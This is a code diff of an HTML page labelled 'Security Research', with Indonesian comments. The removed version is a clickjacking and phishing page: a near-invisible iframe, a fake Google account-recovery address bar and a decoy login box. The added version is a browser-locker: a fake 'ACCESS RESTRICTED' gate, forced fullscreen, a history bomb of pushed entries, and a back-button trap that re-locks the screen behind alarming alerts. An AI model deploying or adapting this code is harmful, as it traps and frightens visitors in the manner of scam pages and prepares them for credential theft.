@@ -3,115 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Research - UI Redressing</title>
+    <title>Security Research - Redirect Hijacking</title>
     <style>
-        body { margin: 0; padding: 0; height: 200vh; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
+        body { margin: 0; padding: 0; background: #000; overflow: hidden; height: 100vh; font-family: sans-serif; }
         
-        /* Bar Navigasi Palsu */
-        .fake-bar {
-            position: fixed; top: 0; width: 100%; height: 56px;
-            background: #202124; display: none; align-items: center;
-            padding: 0 15px; z-index: 10002; border-bottom: 1px solid #3c4043;
-            box-sizing: border-box; color: #e8eaed;
-        }
-
-        /* IFRAME TRANSPARAN (The Invisible Trap) */
-        #evilIframe {
+        /* IFRAME UTAMA: Mengisi seluruh layar */
+        #evilHost {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            border: none; z-index: 10001; display: none;
-            /* Set opacity ke 0.01 agar tidak terlihat tapi tetap menangkap klik */
-            opacity: 0.01; 
-            background: red; /* Hanya untuk penanda saat dev */
+            border: none; display: none; z-index: 9999;
+            background: white;
         }
 
-        .container { padding: 20px; text-align: center; margin-top: 100px; }
-        .btn-fix {
-            padding: 20px 40px; background: #d93025; color: white; 
-            border: none; border-radius: 5px; font-weight: bold; cursor: pointer;
+        .start-page {
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; height: 100vh; color: white; text-align: center;
         }
-
-        /* Apa yang DILIHAT user (Decoy) */
-        #decoyContent {
-            display: none; text-align: center; color: white; margin-top: 100px;
-            pointer-events: none; /* Penting: agar klik tembus ke iframe di atasnya */
-        }
-        .login-box {
-            background: white; color: black; padding: 25px; border-radius: 8px;
-            max-width: 320px; margin: auto;
+        .btn-start {
+            padding: 20px 40px; background: #d93025; color: white;
+            border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
+            font-size: 1.1rem;
         }
     </style>
 </head>
 <body>
 
-    <div class="fake-bar" id="fakeBar">
-        <span>🔒</span> <span style="margin-left:10px; font-size: 14px;">google.com/account-recovery</span>
+    <div class="start-page" id="gate">
+        <h1 style="color: #ff4d4d;">⚠ ACCESS RESTRICTED</h1>
+        <p>Security protocol required to unlock this content.</p>
+        <button class="btn-start" onclick="enterThePrison()">UNLOCK NOW</button>
     </div>
 
-    <iframe id="evilIframe" src="about:blank"></iframe>
+    <iframe id="evilHost" src="https://www.wikipedia.org"></iframe> <script>
+        const iframe = document.getElementById('evilHost');
+        const gate = document.getElementById('gate');
 
-    <div class="container" id="startSection">
-        <h2>⚠ SYSTEM ALERT</h2>
-        <p>Security verification is required to continue.</p>
-        <button class="btn-fix" onclick="launchCombo()">VERIFY NOW</button>
-    </div>
+        function enterThePrison() {
+            // 1. Tampilkan Iframe & Sembunyikan Gerbang
+            gate.style.display = "none";
+            iframe.style.display = "block";
 
-    <div id="decoyContent">
-        <div class="login-box">
-            <h3 style="color: #d93025;">Session Expired</h3>
-            <p style="font-size: 13px; color: #666;">Please sign in to unlock your browser navigation.</p>
-            <div style="border: 1px solid #ccc; padding: 10px; margin: 10px 0; border-radius: 4px; color: #888; text-align: left;">Email or phone</div>
-            <div style="border: 1px solid #ccc; padding: 10px; margin: 10px 0; border-radius: 4px; color: #888; text-align: left;">Password</div>
-            <button style="width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-weight:bold;">Next</button>
-        </div>
-        <p style="margin-top: 20px; font-size: 12px; color: #555;">(Attempting to go back will re-lock the screen)</p>
-    </div>
-
-    <script>
-        const el = document.documentElement;
-
-        function forceFullscreen() {
+            // 2. Fullscreen (Sembunyikan UI Browser)
+            const el = document.documentElement;
             if (el.requestFullscreen) el.requestFullscreen();
             else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-        }
 
-        function launchCombo() {
-            // Aktifkan jebakan UI
-            document.getElementById('startSection').style.display = "none";
-            document.getElementById('decoyContent').style.display = "block";
-            document.getElementById('fakeBar').style.display = "flex";
-            document.getElementById('evilIframe').style.display = "block";
-
-            forceFullscreen();
-
-            // Kunci navigasi dengan History Bomb
-            for (let i = 0; i < 100; i++) {
-                window.history.pushState({p: i}, "", "?session=" + Math.random().toString(36).substring(7));
+            // 3. History Bomb (Kunci Tombol Back)
+            for (let i = 0; i < 80; i++) {
+                window.history.pushState({p: i}, "", "?session_locked=" + Math.random().toString(36).substring(7));
             }
 
-            alert("Sesi navigasi Anda telah dikunci untuk keamanan.");
+            alert("Security Tunnel Established. Navigation is now restricted for your protection.");
         }
 
-        // Interceptor Tombol Back (The Loop)
+        // 4. THE ESCAPE BLOCKER (The Loop)
         window.onpopstate = function() {
             if (navigator.vibrate) navigator.vibrate(200);
-            
-            alert("⚠️ PERINGATAN: Navigasi diblokir!\nSelesaikan verifikasi untuk keluar.");
-            
-            setTimeout(() => {
-                forceFullscreen();
-                // Tambah amunisi history
-                for (let i = 0; i < 10; i++) {
-                    window.history.pushState(null, "", "?relock=" + Date.now());
-                }
-                window.scrollTo(0, 56);
-            }, 50);
-        };
 
-        // Anti-Scroll manual
-        window.onscroll = function() {
-            if (window.pageYOffset < 50) {
-                window.scrollTo(0, 56);
-            }
+            // Alert ini memberikan "User Activation" baru untuk re-lock Fullscreen
+            alert("⚠️ SECURITY VIOLATION:\nUnauthorized navigation attempt detected.\n\nClick OK to re-secure this session.");
+
+            setTimeout(() => {
+                // Re-Lock Fullscreen
+                const el = document.documentElement;
+                if (el.requestFullscreen) el.requestFullscreen();
+                
+                // Tambah amunisi history lagi
+                for (let i = 0; i < 10; i++) {
+                    window.history.pushState(null, "", "?secure_relock=" + Date.now());
+                }
+            }, 50);
         };
     </script>
 </body>
